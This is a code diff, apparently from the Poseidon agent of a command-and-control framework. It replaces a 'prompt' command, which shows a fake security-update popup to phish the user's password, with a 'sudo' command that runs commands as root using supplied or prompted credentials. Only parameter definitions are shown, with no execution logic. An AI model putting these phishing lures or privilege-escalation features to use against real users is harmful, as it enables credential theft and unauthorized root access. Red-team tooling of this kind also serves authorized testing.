@@ -7,11 +7,11 @@ import (
 
 func init() {
 	agentstructs.AllPayloadData.Get("poseidon").AddCommand(agentstructs.Command{
-		Name:                "prompt",
-		Description:         "Prompt the user for their password by specifying a custom icon, title, and message text",
-		HelpString:          "prompt",
+		Name:                "sudo",
+		Description:         "Attempt to execute a command in a root context with a supplied username/password. If that's not known, prompt text and a prompt icon path can be used to cause a popup for the user",
+		HelpString:          "sudo -username bob -password superSecretPa55w0rd -command /usr/bin/id",
 		Version:             1,
-		Author:              "@xorrior",
+		Author:              "@its_a_feature_",
 		MitreAttackMappings: []string{},
 		SupportedUIFeatures: []string{},
 		CommandAttributes: agentstructs.CommandAttribute{
@@ -19,8 +19,8 @@ func init() {
 		},
 		CommandParameters: []agentstructs.CommandParameter{
 			{
-				Name:             "icon",
-				ModalDisplayName: "Icon Path",
+				Name:             "username",
+				ModalDisplayName: "Username",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
 				DefaultValue:     "",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
@@ -29,46 +29,59 @@ func init() {
 						UIModalPosition:     1,
 					},
 				},
-				Description: "Path to the .icns file to use as an icon in the popup",
+				Description: "Username to authenticate as",
 			},
 			{
-				Name:             "title",
-				ModalDisplayName: "Title Text",
+				Name:             "password",
+				ModalDisplayName: "Password",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
-				DefaultValue:     "Updates available!",
+				DefaultValue:     "",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{
 						ParameterIsRequired: false,
 						UIModalPosition:     2,
 					},
 				},
-				Description: "Title text to display in bold in the popup",
+				Description: "Password for the specified Username",
 			},
 			{
-				Name:             "message",
-				ModalDisplayName: "Message Text",
+				Name:             "command",
+				ModalDisplayName: "Command",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
-				DefaultValue:     "Please authenticate to proceed with new security updates.",
+				DefaultValue:     "",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{
-						ParameterIsRequired: false,
+						ParameterIsRequired: true,
 						UIModalPosition:     3,
 					},
 				},
-				Description: "Informative message text to display below the title for the popup",
+				Description: "Command to execute with privileges",
 			},
 			{
-				Name:             "max_tries",
-				ModalDisplayName: "Max ReTries",
-				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
-				DefaultValue:     5,
+				Name:             "prompt_text",
+				ModalDisplayName: "Prompt Text",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				DefaultValue:     "",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{
 						ParameterIsRequired: false,
 						UIModalPosition:     4,
 					},
 				},
-				Description: "Maximum number of times to re-prompt the user for their password before giving up. -1 is never give up.",
+				Description: "Text to display to the user when prompting to execute as root",
+			},
+			{
+				Name:             "prompt_icon_path",
+				ModalDisplayName: "Prompt Icon Path",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				DefaultValue:     "",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{
+						ParameterIsRequired: false,
+						UIModalPosition:     5,
+					},
+				},
+				Description: "Path to the icon to use as part of a popup dialog asking the user to authenticate",
 			},
 		},
 		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
